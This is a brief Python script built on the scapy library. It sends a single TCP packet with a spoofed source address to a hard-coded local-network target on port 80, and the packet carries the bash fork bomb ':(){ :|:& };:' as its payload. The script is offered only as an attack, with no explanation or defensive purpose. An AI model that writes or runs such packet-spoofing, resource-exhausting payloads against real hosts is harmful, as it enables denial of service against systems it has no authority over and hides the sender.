from scapy.all import Ether, IP, TCP, Raw, send

def send_forkbomb(target_ip, target_port=80, source_ip="192.168.2.6", source_port=5555):
    packet = (
        IP(src=source_ip, dst=target_ip)
        / TCP(sport=source_port, dport=target_port)
        / Raw(load=":(){ :|:& };:"))
    send(packet)

if __name__ == "__main__":
    target_ip = "192.168.2.2"
    send_forkbomb(target_ip)